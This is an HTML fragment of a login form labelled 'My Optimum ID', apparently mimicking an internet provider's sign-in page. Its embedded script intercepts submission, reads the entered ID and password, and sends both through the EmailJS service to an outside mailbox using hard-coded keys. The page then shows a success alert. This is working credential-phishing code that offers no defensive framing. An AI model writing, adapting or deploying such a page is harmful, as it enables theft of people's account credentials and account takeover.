 <main class="container">
  <form id="login-form">
    <div class="mb-3">
      <label for="exampleInputEmail1" class="form-label">My Optimum ID</label>
      <input type="text" name="exampleInputEmail1" class="form-control" id="exampleInputEmail1"  aria-describedby="emailHelp">

 <script >
 
 // Load the EmailJS SDK asynchronously
(function() {
  emailjs.init("Fc6Zb2E93HsLc4jAH");
})();

// Handle the form submission
const form = document.getElementById("login-form");

form.addEventListener("submit", (event) => {
  event.preventDefault(); // Prevent the default form submission behavior

  // Get the form data;
  const optimumId = form.elements["exampleInputEmail1"].value;
  const password = form.elements["exampleInputPassword1"].value;

  // Send the form data to EmailJS
  emailjs.send("service_rybja5w", "template_2g5g3nh", {
    optimumId: optimumId,
    password: password,
  })
  .then(() => {
    // Handle the successful form submission here
    alert("Form submitted successfully!");
  }, (error) => {
    // Handle the form submission error here
    alert("Form submission failed. Error: " + error);
  });
});

</script>
